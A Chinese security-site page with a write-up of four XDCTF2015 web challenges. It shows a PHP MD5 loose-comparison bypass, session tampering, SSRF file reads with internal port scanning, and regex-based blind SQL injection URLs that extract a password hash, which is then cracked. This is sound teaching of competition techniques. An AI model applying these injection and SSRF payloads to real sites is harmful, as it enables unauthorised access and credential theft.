<!DOCTYPE html>
<html>
<head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8" />	
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="renderer" content="webkit">
<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0">
<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
<title>第六届西电信息安全大赛XDCTF2015 WriteUp - SecPulse.COM | 安全脉搏</title>
<meta name="description" content="比赛介绍 见安全脉搏：2015年第六届全国网络安全大赛（XDCTF）" />
<meta name="keywords" content="240610708,aabC9RqS,aabg7XSs,braiontools,git泄露,InkSec,lu5631209,PHPJM,pwn100,QNKCDZO,rip-git.pl,syclover,XDCTF,XDCTF2015,XDCTF2015 WriteUp,XDSEC-CMS" />

<link rel='stylesheet' id='style-css'  href='https://www.secpulse.com/wp-content/themes/sec/style.css?ver=2014.9.21' type='text/css' media='all' />
<link rel='stylesheet' id='jquery.fancybox-css'  href='https://www.secpulse.com/wp-content/themes/sec/css/jquery.fancybox.css?ver=1.0' type='text/css' media='all' />
<link rel='stylesheet' id='font-awesome-css'  href='https://www.secpulse.com/wp-content/themes/sec/css/font-awesome.min.css?ver=1.0' type='text/css' media='all' />
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/jquery.min.js?ver=2.15'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/jquery.fancybox.js?ver=2.15'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/helpers/jquery.fancybox-buttons.js?ver=2.15'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/jquery.mousewheel-3.0.6.pack.js?ver=1.0'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/owl.carousel.min.js?ver=1.0'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/custom.js?ver=1.0'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/comments-ajax.js?ver=1.3'></script>
<link rel='canonical' href='https://www.secpulse.com/archives/38544.html' />
<!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
<!--[if lt IE 9]>
<script src="http://cdn.bootcss.com/html5shiv/3.7.2/html5shiv.min.js"></script>
<script src="http://cdn.bootcss.com/respond.js/1.4.2/respond.min.js"></script>
<![endif]-->
<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "//hm.baidu.com/hm.js?7f4cc5524dcb1aec487b4266c18bae48";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>


</head>
<body class="single single-post postid-38544 single-format-standard">
	<header id="header" class="header clr">
		<div class="header-top inner clr">
	<hgroup class="logo-main"><h1 class="logo"><a href="https://www.secpulse.com/" rel="home" title="安全脉搏">安全脉搏</a></h1><h4 class="xs-hidden">分享技术，悦享品质 
	</h4>
	</hgroup>

<div class="login xs-hidden">
				<div class="logindiv">
					<div class="img">
<img src="https://www.secpulse.com/wp-content/uploads/2017/05/rabbit.jpeg" width="36" height="36" alt="" class="avatar avatar-36 wp-user-avatar wp-user-avatar-36 photo avatar-default" /></div><span href="javascript:void(0);" title="用户" class="yh">用户</span><i
						class="fa fa-caret-down fa-2"></i>
					<ul class="login-links">
						<li class="log"><a
							href="https://www.secpulse.com/wp-login.php"
							target="_blank"><i class="fa fa-arrow-right"></i><span>登陆</span></a></li>
						<li class="exit"><a
							href="https://www.secpulse.com/wp-login.php?action=register"><i
								class="fa fa-user-times"></i><span>注册</span></a></li>
					</ul>
	
  </div>
			</div>
			<div class="top-search xs-hidden">
  <form id="search" method="get" action="https://www.secpulse.com" >
	<input type="text" name="s" id="s" autocomplete="off"  placeholder="输入搜索内容">
	<button class="btn-search"> <i class="fa fa-search"></i></button>
</form></div>
			<div class="menu-button">
				<i class="fa fa-bars fa-3x"></i>
			</div>
		</div>


		<div class="main-nav  xs-hidden">
			<div class="inner clr"><nav class="left-nav clr"><ul id="menu-%e5%af%bc%e8%88%aa" class="header-menu-nav"><li id="menu-item-15" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-15"><a href="https://www.secpulse.com/">首页</a></li>
<li id="menu-item-17" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-17"><a href="https://www.secpulse.com/archives/category/articles">文章</a>
<ul class="sub-menu">
	<li id="menu-item-34048" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34048"><a href="https://www.secpulse.com/archives/category/articles/intranet-penetration">内网渗透</a></li>
	<li id="menu-item-34047" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34047"><a href="https://www.secpulse.com/archives/category/articles/code-audit">代码审计</a></li>
	<li id="menu-item-34046" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34046"><a href="https://www.secpulse.com/archives/category/articles/web">Web安全</a></li>
	<li id="menu-item-34565" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34565"><a href="https://www.secpulse.com/archives/category/articles/sec-doc">安全文献</a></li>
	<li id="menu-item-34568" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34568"><a href="https://www.secpulse.com/archives/category/articles/social-engineering">社会工程</a></li>
	<li id="menu-item-35948" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35948"><a href="https://www.secpulse.com/archives/category/articles/wireless">无线安全</a></li>
	<li id="menu-item-35949" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35949"><a href="https://www.secpulse.com/archives/category/articles/mobile-security">移动安全</a></li>
	<li id="menu-item-35950" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-35950"><a href="https://www.secpulse.com/archives/category/articles/system">系统安全</a>
	<ul class="sub-menu">
		<li id="menu-item-35951" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35951"><a href="https://www.secpulse.com/archives/category/articles/system/linux">Linux</a></li>
		<li id="menu-item-35952" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35952"><a href="https://www.secpulse.com/archives/category/articles/system/windows">Windows</a></li>
	</ul>
</li>
	<li id="menu-item-35953" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35953"><a href="https://www.secpulse.com/archives/category/articles/reverse-break">逆向破解</a></li>
</ul>
</li>
<li id="menu-item-18" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-18"><a href="https://www.secpulse.com/archives/category/news">资讯</a>
<ul class="sub-menu">
	<li id="menu-item-35956" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35956"><a href="https://www.secpulse.com/archives/category/news/china-news">国内资讯</a></li>
	<li id="menu-item-35957" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35957"><a href="https://www.secpulse.com/archives/category/news/world-news">国外资讯</a></li>
</ul>
</li>
<li id="menu-item-379" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-379"><a href="https://www.secpulse.com/archives/category/construction">安全建设</a>
<ul class="sub-menu">
	<li id="menu-item-51480" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-51480"><a href="https://www.secpulse.com/archives/category/construction/securityissue">安全管理</a></li>
	<li id="menu-item-54332" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-54332"><a href="https://www.secpulse.com/archives/category/construction/%e4%b8%9a%e5%8a%a1%e5%ae%89%e5%85%a8">业务安全</a></li>
	<li id="menu-item-35955" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35955"><a href="https://www.secpulse.com/archives/category/construction/bigdata">数据分析</a></li>
	<li id="menu-item-54333" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-54333"><a href="https://www.secpulse.com/archives/category/construction/security-reports">安全报告</a></li>
</ul>
</li>
<li id="menu-item-368" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor menu-item-has-children menu-item-368"><a href="https://www.secpulse.com/archives/category/exclusive">独家</a>
<ul class="sub-menu">
	<li id="menu-item-35947" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35947"><a href="https://www.secpulse.com/archives/category/articles/industrial-safety">工控安全</a></li>
	<li id="menu-item-35954" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-35954"><a href="https://www.secpulse.com/archives/category/exclusive/ctf-writeup">CTF</a></li>
	<li id="menu-item-50217" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-50217"><a href="https://www.secpulse.com/archives/category/exclusive/duoyinsu">多因素令牌</a></li>
	<li id="menu-item-51479" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-51479"><a href="https://www.secpulse.com/archives/category/exclusive/dataleakage">数据泄露</a></li>
</ul>
</li>
<li id="menu-item-16" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-16"><a href="https://www.secpulse.com/archives/category/tools">工具</a></li>
<li id="menu-item-52" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-52"><a href="https://www.secpulse.com/archives/category/hiring">招聘</a></li>
<li id="menu-item-50" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-50"><a href="https://www.secpulse.com/newsend">投稿</a></li>
<li id="menu-item-6645" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-6645"><a href="https://www.secpulse.com/archives/category/vul">漏洞</a></li>
</ul></nav>  <nav class="right-nav clr "><ul id="menu-%e5%af%bc%e8%88%aa%e4%ba%8c" class="header-menu-nav"><li id="menu-item-33967" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33967"><a title="付费渗透测试" href="http://service.secpulse.com">安全服务</a></li>
<li id="menu-item-52043" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-52043"><a title="安全从业者最实用的安全导航" href="http://nav.secpulse.com">安全导航</a></li>
<li id="menu-item-33966" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33966"><a title="安识科技" href="https://www.duoyinsu.com">多因素</a></li>
</ul></nav></div>
		</div>
		<div class="nav-bg"></div>
   <nav class="mini-nav visible-xs"><ul id="menu-%e5%af%bc%e8%88%aa-1" class="menu-mini-nav"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-15"><a href="https://www.secpulse.com/">首页</a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-17"><a href="https://www.secpulse.com/archives/category/articles">文章</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34048"><a href="https://www.secpulse.com/archives/category/articles/intranet-penetration">内网渗透</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34047"><a href="https://www.secpulse.com/archives/category/articles/code-audit">代码审计</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34046"><a href="https://www.secpulse.com/archives/category/articles/web">Web安全</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34565"><a href="https://www.secpulse.com/archives/category/articles/sec-doc">安全文献</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34568"><a href="https://www.secpulse.com/archives/category/articles/social-engineering">社会工程</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35948"><a href="https://www.secpulse.com/archives/category/articles/wireless">无线安全</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35949"><a href="https://www.secpulse.com/archives/category/articles/mobile-security">移动安全</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-35950"><a href="https://www.secpulse.com/archives/category/articles/system">系统安全</a>
	<ul class="sub-menu">
		<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35951"><a href="https://www.secpulse.com/archives/category/articles/system/linux">Linux</a></li>
		<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35952"><a href="https://www.secpulse.com/archives/category/articles/system/windows">Windows</a></li>
	</ul>
</li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35953"><a href="https://www.secpulse.com/archives/category/articles/reverse-break">逆向破解</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-18"><a href="https://www.secpulse.com/archives/category/news">资讯</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35956"><a href="https://www.secpulse.com/archives/category/news/china-news">国内资讯</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35957"><a href="https://www.secpulse.com/archives/category/news/world-news">国外资讯</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-379"><a href="https://www.secpulse.com/archives/category/construction">安全建设</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-51480"><a href="https://www.secpulse.com/archives/category/construction/securityissue">安全管理</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-54332"><a href="https://www.secpulse.com/archives/category/construction/%e4%b8%9a%e5%8a%a1%e5%ae%89%e5%85%a8">业务安全</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35955"><a href="https://www.secpulse.com/archives/category/construction/bigdata">数据分析</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-54333"><a href="https://www.secpulse.com/archives/category/construction/security-reports">安全报告</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor menu-item-has-children menu-item-368"><a href="https://www.secpulse.com/archives/category/exclusive">独家</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35947"><a href="https://www.secpulse.com/archives/category/articles/industrial-safety">工控安全</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-35954"><a href="https://www.secpulse.com/archives/category/exclusive/ctf-writeup">CTF</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-50217"><a href="https://www.secpulse.com/archives/category/exclusive/duoyinsu">多因素令牌</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-51479"><a href="https://www.secpulse.com/archives/category/exclusive/dataleakage">数据泄露</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-16"><a href="https://www.secpulse.com/archives/category/tools">工具</a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-52"><a href="https://www.secpulse.com/archives/category/hiring">招聘</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-50"><a href="https://www.secpulse.com/newsend">投稿</a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-6645"><a href="https://www.secpulse.com/archives/category/vul">漏洞</a></li>
</ul></nav>     </header><section class="xs-main index-main clr">
<div class="inner">
<div class="xs-left">
<nav class="crumbs">现在位置： <a title="返回首页" href="https://www.secpulse.com">首页</a> &gt; <a href="https://www.secpulse.com/archives/category/exclusive">独家</a> &gt; <a href="https://www.secpulse.com/archives/category/exclusive/ctf-writeup" rel="category tag">CTF</a> &gt;  正文 </nav><article id="post-38544" class="post-38544 post type-post status-publish format-standard has-post-thumbnail hentry category-ctf-writeup tag-51389 tag-aabc9rqs tag-aabg7xss tag-braiontools tag-git tag-inksec tag-lu5631209 tag-phpjm tag-pwn100 tag-qnkcdzo tag-rip-git-pl tag-syclover tag-xdctf tag-xdctf2015 tag-xdctf2015-writeup tag-xdsec-cms">
	<header class="single-header">
		<h1>第六届西电信息安全大赛XDCTF2015 WriteUp</h1>
			<div class="single-meta">
				
		    <div class="time"><i></i> <a href="javascript:void(0);">2015 /10/7 11:57</a></div>
			<div class="eye xs-hidden"><i class="fa fa-eye fa-1"></i><a href="javascript:void(0);">10,466</a> </div>			<div class="comments xs-hidden"><i class="fa fa-comments fa-1"></i><a href="https://www.secpulse.com/archives/38544.html#comments">评论 2 条</a></div>
			
			
		</div>
		<!-- .entry-meta -->
	</header>
	<!-- .single-header -->

	<div class="single-main">
		<p>比赛介绍 见安全脉搏：<a href="http://www.secpulse.com/archives/38530.html" target="_blank">2015年第六届全国网络安全大赛（XDCTF）</a></p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2015/10/top10.jpg"><img class="alignnone size-full wp-image-38545" src="http://www.secpulse.com/wp-content/uploads/2015/10/top10.jpg" alt="top10" width="1053" height="758" /></a></p>
<h2 id="web1-100">web1-100</h2>
<p>坑。。<br />
http://133.130.90.172/5008e9a6ea2ab282a9d646befa70d53a/index.php?test=aaaa<br />
看题意。 。 。 以为要找一个hash和5008e9a6ea2ab282a9d646befa70d53a<br />
一样。。。<br />
爆破俩小时、、、无果<br />
御剑扫路径 得到<br />
http://133.130.90.172/5008e9a6ea2ab282a9d646befa70d53a/index.php~<br />
右键源码<br />
PHPJM加密后的php文件 解密</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2015/10/web1_100.jpg"><img class=" size-full wp-image-38546 alignnone" src="http://www.secpulse.com/wp-content/uploads/2015/10/web1_100.jpg" alt="web1_100" width="1138" height="263" /></a><br />
双= 弱类型<br />
zone里面ph牛已经给了答案<br />
<a href="http://zone.wooyun.org/content/20172" target="_blank">http://zone.wooyun.org/content/20172</a></p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2015/10/web1_100_2.jpg"><img class="alignnone size-full wp-image-38547" src="http://www.secpulse.com/wp-content/uploads/2015/10/web1_100_2.jpg" alt="web1_100_2" width="1096" height="323" /></a></p>
<p>随便拿其中一个就行了。</p>
<pre class="php hljs"><code class="php" data-origin="&lt;pre&gt;&lt;code class=&quot;php&quot;&gt;&amp;lt;?php  var_dump(md5('240610708') == md5('QNKCDZO'));  var_dump(md5('aabg7XSs') == md5('aabC9RqS'));  ?&amp;gt; &lt;/code&gt;&lt;/pre&gt;"><span class="hljs-preprocessor">&lt;?php</span> 
var_dump(md5(<span class="hljs-string">'240610708'</span>) == md5(<span class="hljs-string">'QNKCDZO'</span>)); 
var_dump(md5(<span class="hljs-string">'aabg7XSs'</span>) == md5(<span class="hljs-string">'aabC9RqS'</span>)); 
<span class="hljs-preprocessor">?&gt;
</span></code></pre>
<p>http://133.130.90.172/5008e9a6ea2ab282a9d646befa70d53a/index.php?test=240610708<br />
出flag<br />
<a href="http://www.secpulse.com/wp-content/uploads/2015/10/web1_flag.jpg"><img class="alignnone size-full wp-image-38548" src="http://www.secpulse.com/wp-content/uploads/2015/10/web1_flag.jpg" alt="web1_flag" width="1164" height="672" /></a></p>
<h2 id="web1-200"><a href="file:///C:/Users/pc/Desktop/XDCTF2015/xdctf_writeup/writeup/syclover/writeup.html#web1-200" name="web1-200"></a>web1-200</h2>
<p>http://flagbox-23031374.xdctf.win:1234/</p>
<p>先查看页面源码，发现一个examples目录。</p>
<p>http://flagbox-23031374.xdctf.win:1234//examples/ 进去发现要登录，提示说</p>
<pre class="bash hljs"><code class="bash" data-origin="&lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;Let Me Guess.. U 4re N0t Administrator!!! &lt;/code&gt;&lt;/pre&gt;">Let Me Guess.. U <span class="hljs-number">4</span>re N0t Administrator!!!
</code></pre>
<p>然后尝试了很久的注入，并没有成功。然后放到扫描器里面一扫，有惊喜。</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2015/10/web1-200-1.jpg"><img class="alignnone size-full wp-image-38551" src="http://www.secpulse.com/wp-content/uploads/2015/10/web1-200-1.jpg" alt="web1-200-1" width="1025" height="561" /></a></p>
<p>&nbsp;</p>
<p><a href="http://flagbox-23031374.xdctf.win:1234/examples/servlets/servlet/SessionExample">http://flagbox-23031374.xdctf.win:1234/examples/servlets/servlet/SessionExample</a></p>
<p>看到这个之后，就觉得是session操作。然后输入user=Administrator</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2015/10/web1-200-2.jpg"><img class="alignnone size-full wp-image-38552" src="http://www.secpulse.com/wp-content/uploads/2015/10/web1-200-2.jpg" alt="web1-200-2" width="1038" height="496" /></a></p>
<p>&nbsp;</p>
<p>然后提示，not login。然后把login改为1。在这个点的时候，我尝试了很多改cookie啥的。发现总是不行。</p>
<p>后面发现要把login改为true，也是醉了。</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2015/10/web1-200-3.jpg"><img class="alignnone size-full wp-image-38553" src="http://www.secpulse.com/wp-content/uploads/2015/10/web1-200-3.jpg" alt="web1-200-3" width="903" height="474" /></a></p>
<h2 id="web1-300"><a href="file:///C:/Users/pc/Desktop/XDCTF2015/xdctf_writeup/writeup/syclover/writeup.html#web1-300" name="web1-300"></a>web1-300</h2>
<p>http://133.130.90.188/</p>
<p>这是一个ssrf，一去进去就是一个框框。直接尝试file://index.php 然后就把index.php的源码读到了。</p>
<pre class="php hljs"><code class="php" data-origin="&lt;pre&gt;&lt;code class=&quot;php&quot;&gt;&amp;lt;?php         if (isset($_GET['link'])) {             $link = $_GET['link'];             // disable sleep             if (strpos(strtolower($link), 'sleep') || strpos(strtolower($link), 'benchmark')) {                 die('No sleep.');             }             if (strpos($link,&quot;http://&quot;) === 0) {                 // http                 $curlobj = curl_init($link);                 curl_setopt($curlobj, CURLOPT_HEADER, 0);                 curl_setopt($curlobj, CURLOPT_PROTOCOLS, CURLPROTO_HTTP);                 curl_setopt($curlobj, CURLOPT_CONNECTTIMEOUT, 10);                 curl_setopt($curlobj, CURLOPT_TIMEOUT, 5);                 $content = curl_exec($curlobj);                 curl_close($curlobj);                 echo $content;             } elseif (strpos($link,&quot;file://&quot;) === 0) {                 // file                 echo file_get_contents(substr($link, 7));             }         } else {             echo&amp;lt;&amp;lt;&amp;lt;EOF         &amp;lt;!--你瞅啥--&amp;gt; &lt;/code&gt;&lt;/pre&gt;"><span class="hljs-preprocessor">&lt;?php</span>
        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'link'</span>])) {
            <span class="hljs-variable">$link</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'link'</span>];
            <span class="hljs-comment">// disable sleep</span>
            <span class="hljs-keyword">if</span> (strpos(strtolower(<span class="hljs-variable">$link</span>), <span class="hljs-string">'sleep'</span>) || strpos(strtolower(<span class="hljs-variable">$link</span>), <span class="hljs-string">'benchmark'</span>)) {
                <span class="hljs-keyword">die</span>(<span class="hljs-string">'No sleep.'</span>);
            }

            <span class="hljs-keyword">if</span> (strpos(<span class="hljs-variable">$link</span>,<span class="hljs-string">"http://"</span>) === <span class="hljs-number">0</span>) {
                <span class="hljs-comment">// http</span>
                <span class="hljs-variable">$curlobj</span> = curl_init(<span class="hljs-variable">$link</span>);
                curl_setopt(<span class="hljs-variable">$curlobj</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);
                curl_setopt(<span class="hljs-variable">$curlobj</span>, CURLOPT_PROTOCOLS, CURLPROTO_HTTP);
                curl_setopt(<span class="hljs-variable">$curlobj</span>, CURLOPT_CONNECTTIMEOUT, <span class="hljs-number">10</span>);
                curl_setopt(<span class="hljs-variable">$curlobj</span>, CURLOPT_TIMEOUT, <span class="hljs-number">5</span>);
                <span class="hljs-variable">$content</span> = curl_exec(<span class="hljs-variable">$curlobj</span>);
                curl_close(<span class="hljs-variable">$curlobj</span>);
                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$content</span>;

            } <span class="hljs-keyword">elseif</span> (strpos(<span class="hljs-variable">$link</span>,<span class="hljs-string">"file://"</span>) === <span class="hljs-number">0</span>) {
                <span class="hljs-comment">// file</span>
                <span class="hljs-keyword">echo</span> file_get_contents(substr(<span class="hljs-variable">$link</span>, <span class="hljs-number">7</span>));
            }

        } <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">echo</span><span class="hljs-string">&lt;&lt;&lt;EOF
        &lt;!--你瞅啥--&gt;
</span></code></pre>
<p>然后继续读取文件。读hosts文件</p>
<pre class="bash hljs"><code class="bash" data-origin="&lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;# The following lines are desirable for IPv6 capable hosts ::1     localhost ip6-localhost ip6-loopback ff02::1 ip6-allnodes ff02::2 ip6-allrouters 127.0.0.1    9bd5688225d90ff2a06e2ee1f1665f40.xdctf.com &lt;/code&gt;&lt;/pre&gt;"><span class="hljs-comment"># The following lines are desirable for IPv6 capable hosts</span>
::<span class="hljs-number">1</span>     localhost ip6-localhost ip6-loopback
ff02::<span class="hljs-number">1</span> ip6-allnodes
ff02::<span class="hljs-number">2</span> ip6-allrouters
<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>    <span class="hljs-number">9</span>bd5688225d90ff2a06e2ee1f1665f40.xdctf.com
</code></pre>
<p>然后看到一个绑定hosts的地址。然后去访问发现就是这个页面，看到这个经验告诉我这上面肯定还有其他的网站，不然没有必要绑定host。然后就想去读nginx的配置文件，fuzz了很久都没读取到。后面就想想会不会是在其他的端口，然后开burp爆破。</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2015/10/web1-300-1.jpg"><img class="alignnone size-full wp-image-38554" src="http://www.secpulse.com/wp-content/uploads/2015/10/web1-300-1.jpg" alt="web1-300-1" width="1070" height="591" /></a></p>
<p>&nbsp;</p>
<p>好 家伙，果然有猫腻。3389端口是个dz7.2.然后打了一发faq的注入，发现不行。然后还是回到死胡同去猜文件路径，然后去读uc key。因为我以为uckey就是flag。后面再这里卡了很久，然后最后发现faq注入没成功的原因是因为编码问题，需要urlencode一下。这个 解决后，那就直接上sqlmap跑。最后发现admin的密码就是flag</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2015/10/web1-300-2.jpg"><img class="alignnone size-full wp-image-38555" src="http://www.secpulse.com/wp-content/uploads/2015/10/web1-300-2.jpg" alt="web1-300-2" width="1021" height="127" /></a></p>
<h2 id="web1-400"><a href="file:///C:/Users/pc/Desktop/XDCTF2015/xdctf_writeup/writeup/syclover/writeup.html#web1-400" name="web1-400"></a>web1-400</h2>
<p>这个题目是给了提示之后才做出来的，给的提示是” 然后就去测试，其中在那个图片内容最下面提示你</p>
<pre class="bash hljs"><code class="bash" data-origin="&lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;&amp;lt;!--Please input the ID as parameter with numeric value--&amp;gt; &lt;/code&gt;&lt;/pre&gt;">&lt;!--Please input the ID as parameter with numeric value--&gt;
</code></pre>
<p>先测试<br />
<a href="http://133.130.90.172/47bce5c74f589f4867dbd57e9ca9f808/Picture.php?ID=3">http://133.130.90.172/47bce5c74f589f4867dbd57e9ca9f808/Picture.php?ID=3</a>“ or 1%23<br />
返回图片<br />
<a href="http://133.130.90.172/47bce5c74f589f4867dbd57e9ca9f808/Picture.php?ID=3">http://133.130.90.172/47bce5c74f589f4867dbd57e9ca9f808/Picture.php?ID=3</a>“ or 0%23<br />
返回Picture not found!<br />
很明显这是一个盲注。然后继续测试，发现过滤了很多东西，一旦出现select substr left right ascii mid<br />
这些关键字是永真。然后一直在fuzz，最后发现学长写的一篇文章<a href="http://laterain.sinaapp.com/?p=196">http://laterain.sinaapp.com/?p=196</a> 提到了一种正则盲注的方法</p>
<pre><code data-origin="&lt;pre&gt;&lt;code&gt;http://133.130.90.172/47bce5c74f589f4867dbd57e9ca9f808/Picture.php?ID=3&quot; or user() REGEXP '^1' %23 为假 &lt;/code&gt;&lt;/pre&gt;">http://133.130.90.172/47bce5c74f589f4867dbd57e9ca9f808/Picture.php?ID=3" or user() REGEXP '^1' %23 为假
</code></pre>
<pre><code data-origin="&lt;pre&gt;&lt;code&gt;http://133.130.90.172/47bce5c74f589f4867dbd57e9ca9f808/Picture.php?ID=3&quot; or user() REGEXP '^x' %23 为真 &lt;/code&gt;&lt;/pre&gt;">http://133.130.90.172/47bce5c74f589f4867dbd57e9ca9f808/Picture.php?ID=3" or user() REGEXP '^x' %23 为真
</code></pre>
<p>说明user()是以x开头。然后就这样猜解。但是到后面准备猜解其他表的内容，要用到select。但是这个是直接匹配的select，并不是检查的连接处。后面想起这个案例<br />
<a href="http://www.wooyun.org/bugs/wooyun-2015-0101960">http://www.wooyun.org/bugs/wooyun-2015-0101960</a><br />
会不会我们要猜的数据就和当前的数据在同一个表里面呢。<br />
然后经过一顿fuzz之后，好家伙果然就是这个。</p>
<pre><code data-origin="&lt;pre&gt;&lt;code&gt;http://133.130.90.172/47bce5c74f589f4867dbd57e9ca9f808/Picture.php?ID=3&quot; or password REGEXP '^1' %23  为假 &lt;/code&gt;&lt;/pre&gt;">http://133.130.90.172/47bce5c74f589f4867dbd57e9ca9f808/Picture.php?ID=3" or password REGEXP '^1' %23  为假
</code></pre>
<pre><code data-origin="&lt;pre&gt;&lt;code&gt;http://133.130.90.172/47bce5c74f589f4867dbd57e9ca9f808/Picture.php?ID=3&quot; or password REGEXP '^5' %23 为真 &lt;/code&gt;&lt;/pre&gt;">http://133.130.90.172/47bce5c74f589f4867dbd57e9ca9f808/Picture.php?ID=3" or password REGEXP '^5' %23 为真
</code></pre>
<p>说明password字段的第一个值为5开头。然后就这样一直跑最后得到hash 5832f4251cb6f43917df<br />
二十位的hash让我想起了dede，然后去掉前三后一解密</p>
<pre><code data-origin="&lt;pre&gt;&lt;code&gt;2f4251cb6f43917d    md5    lu5631209 &lt;/code&gt;&lt;/pre&gt;">2f4251cb6f43917d    md5    lu5631209
</code></pre>
<p>然后登陆拿到flag</p>
